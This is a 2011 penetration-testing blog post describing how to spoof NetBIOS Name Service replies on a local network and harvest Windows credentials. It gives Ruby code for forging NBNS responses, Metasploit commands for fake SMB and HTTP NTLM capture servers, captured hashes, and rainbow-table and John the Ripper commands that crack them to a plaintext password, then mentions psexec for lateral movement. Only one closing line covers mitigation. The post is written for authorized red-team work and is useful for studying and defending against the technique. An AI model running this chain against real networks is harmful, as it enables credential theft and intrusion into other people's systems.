img,.pls-tailbottom{vertical-align:bottom}.pls-bottomLeft img,.bubbleDropTR,.pls-dropBottomL img,.pls-dropBottom img,.pls-dropBottomR img,.pls-bottomLeft{vertical-align:top}.pls-dropTR{background-position:0 -22px}.pls-dropBR{background-position:0 -27px}.pls-dropBL{background-position:0 -16px}.pls-spacertop,.pls-spacerright,.pls-spacerbottom,.pls-spacerleft{position:static !important}.pls-spinner{bottom:0;position:absolute;left:0;margin:auto;right:0;top:0}</style></head>
<body class="">
<div class="navbar section" id="navbar"><div class="widget Navbar" id="Navbar1"><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"><iframe src="nbns-spoofing-on-your-way-to-world_files/navbar.html" name="navbar-iframe" id="navbar-iframe" vspace="0" tabindex="0" style="" marginwidth="0" marginheight="0" hspace="0" scrolling="no" width="100%" frameborder="0"></iframe></div>
<script gapi_processed="true" type="text/javascript" src="navbar_data/plusone.js"></script>
<script type="text/javascript">
        gapi.load("iframes-styles-bubble", function() {
          if (window.iframes && iframes.open) {
            iframes.open(
                '//www.blogger.com/navbar.g?targetBlogID\0756256684586716847588\46blogName\75Packetstan\46publishMode\75PUBLISH_MODE_HOSTED\46navbarType\75LIGHT\46layoutType\75LAYOUTS\46searchRoot\75http://www.packetstan.com/search\46blogLocale\75en\46v\0752\46homepageUrl\75http://www.packetstan.com/\46targetPostID\0754934681323479353937\46blogPostOrPageUrl\75http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html\46vt\758519613604253852792',
                {
                  container: "navbar-iframe-container",
                  id: "navbar-iframe"
                },
                {
                });
          }
        });
      </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header"><div class="widget Header" id="Header1">
<div id="header-inner">
<div class="titlewrapper">
<h1 class="title">
<a href="http://www.packetstan.com/">Packetstan</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>A blog about packets, tools, and bacon</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol"></div>
<div class="tabs section" id="crosscol-overflow"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main"><div class="widget Blog" id="Blog1">
<div class="blog-posts hfeed">
<!-- google_ad_section_start(name=default) -->

          <div class="date-outer">
        
<h2 class="date-header"><span>31.3.11</span></h2>

          <div class="date-posts">
        
<div class="post-outer">
<div class="post hentry" itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<meta content="http://2.bp.blogspot.com/-_5j2sGP7M0w/TZTwwWcWEgI/AAAAAAAAACE/7_ujJfrecHU/s400/nbnsscreenshot-smaller.png" itemprop="image_url">
<meta content="6256684586716847588" itemprop="blogId">
<meta content="4934681323479353937" itemprop="postId">
<a name="4934681323479353937"></a>
<h3 class="post-title entry-title" itemprop="name">
NBNS Spoofing on your way to World Domination
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-4934681323479353937" itemprop="description articleBody">
I few weeks ago I helped on the Red Team at the <a href="http://mwccdc.org/">Midwest CCDC</a>
 competition in Minneapolis (actually St. Paul, but close enough). There
 were some talented guys there and it was a lot of fun beating on those 
poor kids. I highly recommend you volunteer at events like this. You 
haven't lived until you've slowly ripped the legs off a live domain 
controller while the owner sits and watches, with no ability to do 
anything about it (vnc + disabled mouse and keyboard).<br><br>Whenever I
 get together with a group of people like this, I like to exchange 
techniques and discuss trends. We discussed our paths of least 
resistance for internal tests, and I mentioned that my favorite are the 
attacks based on spoofing NetBIOS Name Service (NBNS) Responses. It is 
the very first tool I fire up on internal penetration tests, and it is 
very valuable on wireless penetration tests where client laptops are in 
scope. Before we get into the attack method I'll go over a bit of the 
background on what NBNS is.<br><br>When your Windows box needs to determine the IP address for a given name, it tries, in order, the following lookup methods:<br><ul><li>local hosts file - C:\Windows\System32\drivers\etc\hosts</li><br><li>DNS</li><br><li>NBNS</li></ul><br><br>You
 may wonder, how many queries make it past DNS? The answer is, a lot! 
Any fat fingered internal server name, a laptop looking for its domain 
network resources while on another network, or would be web searches 
will generate this traffic. You may ask, web searches, huh? We open our 
browser and type in "packetstan" in the address bar, what does the 
browser do?<br><br>Modern browsers allow you to search via the address 
bar (Chrome doesn't even have a dedicated search box), and the browser 
needs to decide if the text is a host or a query. If the string has 
spaces, it is obviously a search request. If there are no spaces the 
browser doesn't know if we want a server named "packetstan" or we want 
to search google/yahoo/bing for "packetstan", but it first tries to 
access a host named "packetstan" and therefor needs to attempt to 
resolve the IP for the host. i.e. I do a search for "puppies" by browser
 will attempt to get an IP address for "puppies" (how cute).<br><br>The 
hosts file isn't going to have an entry for "packetstan", and DNS is 
going to fail to lookup "packetstan" (no .com). So we land on NBNS. Here
 is a screen shot of the transaction:<br><br><a onblur="try {parent.deselectBloggerImageGracefully();} catch(e) {}" href="http://2.bp.blogspot.com/-_5j2sGP7M0w/TZTwwWcWEgI/AAAAAAAAACE/7_ujJfrecHU/s1600/nbnsscreenshot-smaller.png"><img style="display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 302px;" src="nbns-spoofing-on-your-way-to-world_files/nbnsscreenshot-smaller.png" alt="" id="BLOGGER_PHOTO_ID_5590357750922482178" border="0"></a><br><br>Since
 the look up is just a hostname, windows adds the local DNS suffix to 
the query and asks its DNS server(s). The suffix picked up my the 
Windows box usually comes from the DHCP server. As you can see, the DNS 
server replied that it had no idea on how to lookup that name. Next, 
you'll see the NBNS Request. The beautiful thing is, the NBNS Request is
 a broadcast, so anyone can reply easily and redirect traffic. <br><br>If
 we wanted to poison a DNS lookup we would have to somehow get in the 
middle of the traffic, and that takes some additional effort. NBNS is so
 easy I can even do it before I have my first cup of coffee, as I 
usually save MITM attacks until after a few cups of joe.<br><br>Wesley McGrew wrote a <a href="http://www.mcgrewsecurity.com/tools/nbnspoof/">tool</a> to forge NBNS replies. He also has a great <a href="http://www.mcgrewsecurity.com/blog/?p=16">three</a> <a href="http://www.mcgrewsecurity.com/blog/?p=17">part</a> <a href="http://www.mcgrewsecurity.com/blog/?p=18">series</a>
 on the protocol and the tool writing process. Fans of this blog should 
really check out those posts. Now that we have better understanding of 
NBNS, how do we spoof a reply?<br><br>To spoof an NBNS reply, we need to
 craft a reply packet that has the same Transaction ID as the request. 
The Transaction ID is similar to the one used by DNS (BTW, the numbers 
sequential and are reset to \x80\x00 after each reboot). We also need to
 specify the IP address to send in the reply. For all intents and 
purposes, the rest of each response packet can be static.<br><br>Mr. 
McGrew's tool does what we described above, but I wanted it in 
Metasploit, which means rewriting it in ruby. Unfortunately, Racket, the
 packet crafting tool for Ruby, doesn't have a module for NetBIOS, so 
we'll manually dissassemble the packet and create a raw reply packet.<br><br>Using WireShark as a guide, we can pull apart the packet, piece by piece.<br><br><pre>nbnsq_transid      = packet[0..1]<br>nbnsq_flags        = packet[2..3]<br>nbnsq_questions    = packet[4..5]<br>nbnsq_answerrr     = packet[6..7]<br>nbnsq_authorityrr  = packet[8..9]<br>nbnsq_additionalrr = packet[10..11]<br>nbnsq_name         = packet[12..45]<br>nbnsq_type         = packet[46..47]<br>nbnsq_class        = packet[48..49]</pre><br><br>As
 previously mentioned, all we really need is the Transaction ID and the 
Name. The Transaction ID is really simple as it is just two bytes, but 
what if we want to read the name? The raw name looks like this:<br><br><pre>\x20FAEBEDELEFFEFDFEEBEOCACACACACAAA\00</pre><br><br>The
 leading space and trailing null byte are apparent, but what kind of 
encoding is used here? Master McGrew describes it in the <a href="http://www.mcgrewsecurity.com/blog/?p=17">second portion</a>
 of his blog post. Each character in our query ("PACKETSTAN") is split 
into nibbles (half bytes) and each nibble is added to \x41 (A), like 
this: <br><ul><li>P = \x50</li><br><li>1st nibble = 5, second nibble is 0</li><br><li>41 + 5 = 46 and \x46 = F</li><br><li>41 + 0 = 41 and \x41 = A</li><br><li>P is then encoded as FA</li></ul><br><br>We can decode and encode our name with this bit of ruby (remember hex 41 equals decimal 65):<br><br><pre>nbnsq_name.slice(1..-2).each_byte do |c|<br>    decoded &lt;&lt; "#{(c - 65).to_s(16)}"<br>end<br>nbnsq_decodedname = "#{[decoded].pack('H*')}".strip()</pre><br><br>We
 skip the first (space) and last (null) bytes and subtract 65 from each 
so we end up with "5041434B45545354414E20202020". We convert that into 
ASCII characters and strip the trailing spaces to get "PACKETSTAN".<br><br>Fortunately,
 we don't actually need to re-encode the string since we can just use 
the original in our reply. However, I use this string to match a regular
 expression so we only reply to the in-scope clients.<br><br><pre>if (nbnsq_decodedname =~ /#{datastore['REGEX']}/i)<br>    ...</pre><br><br>The
 raw response packet is then created. You'll notice that most of our 
packet is static or taken directly from the Request packet.<br><pre>response = nbnsq_transid +<br>    "\x85\x00" + # Flags = response + authoratative + recursion desired <br>    "\x00\x00" + # Questions = 0<br>    "\x00\x01" + # Answer RRs = 1<br>    "\x00\x00" + # Authority RRs = 0<br>    "\x00\x00" + # Additional RRs = 0<br>    nbnsq_name + # original query name<br>    nbnsq_type + # Type = NB ...whatever that means<br>    nbnsq_class+ # Class = IN<br>    "\x00\x04\x93\xe0" + # TTL = a long ass time<br>    "\x00\x06" + # Datalength = 6<br>    "\x00\x00" + # Flags B-node, unique = whet ever that means<br>    datastore['SPOOFIP'].split('.').collect(&amp;:to_i).pack('C*')</pre><br><br>The
 last line takes the IP address to spoof and converts it to bytes (i.e. 
1.2.3.4 -&gt; \x01\x02\x03\x04). Fortunately, the bytes are <a href="http://en.wikipedia.org/wiki/Endianness">big endian</a>, so we don't have to rearrange the order.<br><br>Now we can run the module in Metasploit:<br><br><pre>msf &gt; <b>use auxiliary/spoof/nbns/nbns_response</b><br>msf auxiliary(nbns) &gt; show options<br><br>Module options (auxiliary/spoof/nbns/nbns_response):<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   REGEX    .*               yes       Regex applied to determene if spoofed reply is sent<br>   SPOOFIP                   yes       IP address with which to poison responses<br>   VERBOSE  true             no        Determines whether to display responses<br><br>msf auxiliary(nbns_response) &gt; <b>set spoofip 192.168.1.52</b><br>spoofip =&gt; 192.168.1.52<br>msf auxiliary(nbns_response) &gt; <b>run</b><br>[*] Auxiliary module execution completed<br><br>[*] NBNS Spoofer initializing<br>[*] NBNS Spoofer initialed. Waiting for packets...</pre><br><br>The default regular expression will match any query, and when one is found you will see a message like this:<br><br><pre>[*] Regex matched PACKETSTAN from 192.168.1.51. Sending reply...</pre><br><br>Ok, great, so we sent a reply and have poisoned a name lookup. So what?<br><br>We
 can use Metasploit to setup a few fake services. That way, if a host 
lookup was for a web server or a file server (smb) the user will be 
directed to our Metasploit instance. The Metasploit modules in question 
will request authentication, and the client will happily send it 
credentials (sort of).<br><br><br><pre>msf &gt; <b>use auxiliary/server/capture/smb</b><br>msf auxiliary(smb) &gt; <b>set JOHNPWFILE /home/tm/johnsmb</b><br>JOHNPWFILE =&gt; /home/tm/johnsmb<br>msf auxiliary(smb) &gt; show options <br><br>Module options (auxiliary/server/capture/smb):<br><br>   Name        Current Setting   Required  Description<br>   ----        ---------------   --------  -----------<br>   CAINPWFILE                    no        The local filename to store the hashes in Cain&amp;Abel format<br>   CHALLENGE   1122334455667788  yes       The 8 byte challenge <br>   JOHNPWFILE  /home/tm/johnsmb  no        The prefix to the local filename to store the hashes in JOHN format<br>   LOGFILE                       no        The local filename to store the captured hashes<br>   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0<br>   SRVPORT     445               yes       The local port to listen on.<br>   SSL         false             no        Negotiate SSL for incoming connections<br>   SSLVersion  SSL3              no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)<br><br>msf auxiliary(smb) &gt; run<br>[*] Auxiliary module execution completed<br><br>[*] Server started.<br><br>msf auxiliary(smb) &gt; <b>use auxiliary/server/capture/http_ntlm</b><br>msf auxiliary(http_ntlm) &gt; <b>set LOGFILE /home/tm/httplog</b><br>LOGFILE =&gt; /home/tm/johnhttp<br>msf auxiliary(http_ntlm) &gt; <b>set URIPATH /</b><br>URIPATH =&gt; /<br>msf auxiliary(http_ntlm) &gt; <b>set SRVPORT 80</b><br>SRVPORT =&gt; 80<br>msf auxiliary(http_ntlm) &gt; <b>show options</b><br><br>Module options (auxiliary/server/capture/http_ntlm):<br><br>   Name        Current Setting   Required  Description<br>   ----        ---------------   --------  -----------<br>   LOGFILE     /home/tm/httplog  no        The local filename to store the captured hashes<br>   PWFILE                        no        The local filename to store the hashes in Cain&amp;Abel format<br>   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0<br>   SRVPORT     80                yes       The local port to listen on.<br>   SSL         false             no        Negotiate SSL for incoming connections<br>   SSLVersion  SSL3              no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)<br>   URIPATH     /                 no        The URI to use for this exploit (default is random)</pre><br><br>Any
 Windows box that access our SMB share will automatically try to 
authenticate. The web browser is a different story, and depends on the 
browser and if the client machine is joined to a domain. It will either 
send credentials automatically or prompt the user for credentials. The 
table below describes when credentials are automatically sent, and when 
they aren't.<br><br><br><br><br><table style="margin: 1em; border: 1px solid #ccc;"><tbody><tr><td><b>Browser</b></td><td><b>Domain Joined</b></td><td><b>Standalone (Non-Domain)</b></td></tr><tr><td>Chrome</td><td>Automatic</td><td>Performs Google Search</td></tr><tr><td>IE</td><td>Automatic</td><td>User Prompted</td></tr><tr><td>FireFox</td><td>User Prompted</td><td>User Prompted</td></tr></tbody></table><br><br>Most
 of the machines in scope for my test are joined to the corporate 
domain, so this attack works great! A Windows box that is part of a 
domain treats hosts, not FQDN hostnames, as part of its "Local Intranet 
Zone". This zone has all sorts of settings to make single sign-on 
easier. IE and Chrome both use this "Local Intranet Zone", while Firefox
 does not.<br><br>After typing "packetstan" into my browser in Chrome on my domain-joined host, Metasploit gives me this output:<br><br><pre>[*] Regex matched PACKETSTAN from 192.168.1.61. Sending reply...<br>[*] Request '/' from 192.168.1.61:1134<br>[*] Request '/' from 192.168.1.61:1134<br>[*] Request '/' from 192.168.1.61:1134<br>[*] 192.168.1.61: MYDOM\tim 4f717259791a8a3d6a11ae4050ed5c72ee125c7119e2a20f:<br>      44a8674da9a460bca9c615c79a72adad83b5af7ec07eac05 on ALPHA</pre><br><br>If we look at the log file we'll see this:<br><br><pre>$ cat httplog <br>Thu Mar 31 18:18:18 -0500 2011:192.168.1.61:MYDOM:packetstan:tim:4f717259791a8a3d<br>6a11ae4050ed5c72ee125c7119e2a20f:44a8674da9a460bca9c615c79a72adad83b5af7ec07eac05</pre><br><br>The
 SMB capture module will output a John the Ripper compatible file. 
However, the http_ntlm module doesn't give us a the file format we want 
(I'm working on a fix), so we'll have to change the file to look like 
this:<br>&lt;user&gt;:::&lt;LMHASH&gt;:&lt;NTLMHASH&gt;:&lt;CHALLENGE&gt; (wrapped for space, the actually file won't be wrapped):<br><br><pre>MYDOM\tim:::4f717259791a8a3d6a11ae4050ed5c72ee125c7119e2a20f:<br>44a8674da9a460bca9c615c79a72adad83b5af7ec07eac05:1122334455667788</pre><br><br><i>Note:
 Windows 7 and Windows 2008 will not provide a LM Hash and any further 
steps will not work as these steps rely on the weak LM Hash. You can 
still brute force the NetNTLMv2 hash, but there are no shortcuts.</i><br><br>The
 hashes sent via SMB or HTTP aren't your straight LH and NTLM hashes. 
While the full details requires a separate blog post, the short version 
is they are salted with a challenge to "ensure" they can't be reused. 
However, Metasploit uses a static challenge (1122334455667788) so we can
 use rainbow tables to crack the password. The tables can be used with <a href="http://sourceforge.net/projects/rcracki/">rcracki</a>
 and the halflmchall_alpha-numeric (smaller) or halflmchall_all-space 
(larger) tables are available from freerainbowtables.com. You can 
download both of them (28GB) via wget like this:<br><br><pre>$ <b>wget -r ftp://freerainbowtables.mirror.garr.it/mirrors/freerainbowtables/halflmchall/</b></pre><br><br>All
 we need to do is run our hash against the rainbow table. We need the 
first 16 characters of the LM hash output (8 bytes of LM hash) and the 
path to the rainbow tables.<br><br><pre>$ <b>./rcracki_mt -h 4f717259791a8a3d /storage/RainbowTables/halflmchall_alpha-numeric/</b><br>[sudo] password for tm:<br>Using 3 threads for pre-calculation and false alarm checking...<br>Found 4 rainbowtable files...<br><br>halflmchall_alpha-numeric#1-7_0_2400x57648865_1122334455667788_distrrtgen[p][i]_0.rti:<br>file length mismatch<br><br>halflmchall_alpha-numeric#1-7_1_2400x56281894_1122334455667788_distrrtgen[p][i]_0.rti:<br>reading index... 13528977 bytes read, disk access time: 0.01 s<br>reading table... 450255152 bytes read, disk access time: 0.35 s<br>verifying the file... ok<br>searching for 1 hash...<br>plaintext of 4f717259791a8a3d is MYPASSW<br>cryptanalysis time: 3.40 s<br><br>statistics<br>-------------------------------------------------------<br>plaintext found:          1 of 1 (100.00%)<br>total disk access time:   0.36 s<br>total cryptanalysis time: <b>3.40 s</b><br>total chain walk step:    2876401<br>total false alarm:        840<br>total chain walk step due to false alarm: 825144<br><br>result<br>-------------------------------------------------------<br><b>4f717259791a8a3d        MYPASSW hex:4d595041535357</b></pre><br><br>In
 3.4 short seconds we have the first seven characters of the password. 
The latest version (at the time of writing) of John the Ripper (<a href="http://www.openwall.com/john/g/john-1.7.6-jumbo-12.tar.gz">1.7.6-jumbo12</a>)
 has a perl file named netntlm.pl that will bruteforce the second 
portion of the password. We just need to give it the first portion of 
the password and a john compatible file (output trimmed).<br><br><pre>$ <b>perl netntlm.pl --seed MYPASSW --file ~/john-http</b><br><br><br>###########################################################################################<br>The following LM responses have been previously cracked:<br><br>The following NTLM responses have been previously cracked:<br><br><br>###########################################################################################<br>Isolating accounts which have only had their LM response cracked.<br>Account MYDOM\\tim LM response added to cracking list.<br><br>...<br>Loaded 1 password hash (LM C/R DES [netlm])<br>MYPASSWORD1      (MYDOM\\tim)<br>guesses: 1  time: 0:00:00:26  c/s: 515198  trying: MYPASSWORD1</pre><br><br>We
 can see that my password is MYPASSWORD1. However, LM passwords are case
 insensitive and are always presented upper case. To get the case 
sensitive password we run the *same* command again. The second pass will
 use "MYPASSWORD1" against the case sensitive NTLM hash.<br><br><pre>$ <b>perl netntlm.pl --seed MYPASSW --file ~/john-http</b><br><br><br>###########################################################################################<br>The following LM responses have been previously cracked:<br> MYDOM\tim:MYPASSWORD1::4f717259791a8a3d6a11ae4050ed5c72ee125c7119e2a20f:44(trimmed)<br><br>The following NTLM responses have been previously cracked:<br><br>...<br>Performing NTLM case-sensitive crack for account: MYDOM\tim.<br>guesses: 1  time: 0:00:00:00 100.00% (ETA: Thu Mar 31 12:57:51 2011)  c/s: 3352  trying: MyPassword1<br>Loaded 1 password hash (NTLMv1 C/R MD4 DES [netntlm])<br>MyPassword1      (MYDOM\tim)<br>...</pre><br><br>We now have the case sensitive password. Awesome!<br><br>In summary, to use this method perform the following steps:<br><ul><li>Start the following Metasploit modules<br><ul><li>auxiliary/spoof/nbns/nbns</li><br><li>auxiliary/server/capture/smb</li><br><li>auxiliary/server/capture/http_ntlm</li></ul></li><br><li>Crack the first half of the LM hash with rainbow tables</li><br><li>Brute force the second half of the password with john's netntlm.pl</li><br><li>Run the same netntlm.pl again to get the case sensitive password</li></ul><br><br>This method will usually yield credentials pretty quickly, but to get some higher privileged accounts just wait a while.<br><br>Once
 you have a cracked password you can (usually) connect to boxes all over
 the place by  using Metasploit's exploit/windows/smb/psexec module.<br><br>The prevent this attack from being as effective, you need to modify the <a href="http://technet.microsoft.com/en-us/library/cc738867%28WS.10%29.aspx">LAN Manager authentication level</a> to refuse LM via GPO. It isn't enough to use "Send NTLM response only" or "Send NTLMv2 response only".
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1"><span class="post-author vcard">
Posted by
<span class="fn" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">
<meta content="http://www.blogger.com/profile/15437442280236308195" itemprop="url">
<a href="http://www.blogger.com/profile/15437442280236308195" rel="author" title="author profile">
<span itemprop="name">Tim Medin</span>
</a>
</span>
</span>
<span class="post-timestamp">
at
<meta content="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html" itemprop="url">
<a class="timestamp-link" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html" rel="bookmark" title="permanent link"><abbr class="published" itemprop="datePublished" title="2011-03-31T13:21:00-07:00">1:21 PM</abbr></a>
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-287743074">
<a href="http://www.blogger.com/post-edit.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" src="nbns-spoofing-on-your-way-to-world_files/icon18_edit_allbkg.gif" width="18" height="18">
</a>
</span>
</span>
<div class="post-share-buttons goog-inline-block">
<a class="goog-inline-block share-button sb-email" href="http://www.blogger.com/share-post.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;target=email" target="_blank" title="Email This"><span class="share-button-link-text">Email This</span></a><a class="goog-inline-block share-button sb-blog" href="http://www.blogger.com/share-post.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;target=blog" onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target="_blank" title="BlogThis!"><span class="share-button-link-text">BlogThis!</span></a><a class="goog-inline-block share-button sb-twitter" href="http://www.blogger.com/share-post.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;target=twitter" target="_blank" title="Share to Twitter"><span class="share-button-link-text">Share to Twitter</span></a><a class="goog-inline-block share-button sb-facebook" href="http://www.blogger.com/share-post.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;target=facebook" onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target="_blank" title="Share to Facebook"><span class="share-button-link-text">Share to Facebook</span></a><div class="goog-inline-block dummy-container"><div id="___plusone_0" style="height: 20px; width: 300px; display: inline-block; text-indent: 0px; margin: 0px; padding: 0px; background: none repeat scroll 0% 0% transparent; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline;"><iframe title="+1" data-gapiattached="true" allowtransparency="true" src="nbns-spoofing-on-your-way-to-world_files/fastbutton.html" name="I0_1364567924141" id="I0_1364567924141" vspace="0" tabindex="0" style="position: static; top: 0px; width: 300px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 20px;" marginwidth="0" marginheight="0" hspace="0" scrolling="no" width="100%" frameborder="0"></iframe></div></div>
</div>
</div>
<div class="post-footer-line post-footer-line-2"><span class="post-labels">
Labels:
<a href="http://www.packetstan.com/search/label/MetaSploit" rel="tag">MetaSploit</a>,
<a href="http://www.packetstan.com/search/label/NBNS" rel="tag">NBNS</a>,
<a href="http://www.packetstan.com/search/label/NBNSpoof" rel="tag">NBNSpoof</a>,
<a href="http://www.packetstan.com/search/label/Spoof" rel="tag">Spoof</a>
</span>
</div>
<div class="post-footer-line post-footer-line-3"></div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>6 comments:</h4>
<div class="comments-content">
<script async="async" src="nbns-spoofing-on-your-way-to-world_files/comments.html" type="text/javascript"></script>
<script type="text/javascript">
    (function() {
      var items = [{'id': '9030356344735498897', 'body': 'Nice work. Very Offensive I might add', 'timestamp': '1301674441169', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751301674441169#c9030356344735498897', 'author': {'name': 'The Messenger', 'avatarUrl': 'http://img1.blogblog.com/img/openid16-rounded.gif', 'profileUrl': 'http://openid.aol.com/scr0tumshine667'}, 'displayTime': 'April 1, 2011 at 9:14 AM', 'deleteclass': 'item-control blog-admin pid-135424602'}, {'id': '1885634673877669094', 'body': 'Great post ! thanks for sharing.\74br /\76\74br /\76I have a question, when the auxiliary/server/capture/http_ntlm module presents the challenge will the ntlm hash be provided without any user (victim) interaction ?\74br /\76\74br /\76Greetings from Peru', 'timestamp': '1302112544794', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751302112544794#c1885634673877669094', 'author': {'name': 'mvelazco', 'avatarUrl': 'http://img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'http://www.blogger.com/profile/16770625815804345800'}, 'displayTime': 'April 6, 2011 at 10:55 AM', 'deleteclass': 'item-control blog-admin pid-245925734'}, {'id': '8128291457810057213', 'body': 'Absolutely fantastic post.', 'timestamp': '1302793664002', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751302793664002#c8128291457810057213', 'author': {'name': 'Silas Cutler', 'avatarUrl': 'http://1.bp.blogspot.com/-bvGLlxvxsyg/TXr8wscqYkI/AAAAAAAAARM/B1ZLzVLrGhM/s45/Screen%25252Bshot%25252B2011-03-11%25252Bat%25252B11.18.00%25252BPM.png', 'profileUrl': 'http://www.blogger.com/profile/09655591809270593462'}, 'displayTime': 'April 14, 2011 at 8:07 AM', 'deleteclass': 'item-control blog-admin pid-389987173'}, {'id': '4242686565282227198', 'body': 'Super-Duper site! I am loving it!! Will come back again â&#128;&#147; taking your RSS feeds also, Thanks.\74br /\76\74br /\76\74a href\75\42http://consultantmediconline.com#176\42 rel\75\42nofollow\42\76nolvadex\74/a\076', 'timestamp': '1302854510951', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751302854510951#c4242686565282227198', 'author': {'name': 'mudupock', 'avatarUrl': 'http://img1.blogblog.com/img/openid16-rounded.gif', 'profileUrl': 'http://mudupock.wordpress.com/'}, 'displayTime': 'April 15, 2011 at 1:01 AM', 'deleteclass': 'item-control blog-admin pid-2069443078'}, {'id': '9142416299971857712', 'body': 'Great article, just one comment. VERBOSE is off by default so you won\46#39;t see the \46quot;[*] Regex matched PACKETSTAN from 192.168.1.51. Sending reply...\46quot; message.\74br /\76\74br /\76And with the current release VERBOSE isn\46#39;t shown as a basic option so you have to know it is there to enable it. For those who don\46#39;t know how to it is a simple:\74br /\76\74br /\76set VERBOSE true', 'timestamp': '1327438013271', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751327438013271#c9142416299971857712', 'author': {'name': 'Digininja', 'avatarUrl': 'http://img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'http://www.blogger.com/profile/18074871266223305762'}, 'displayTime': 'January 24, 2012 at 12:46 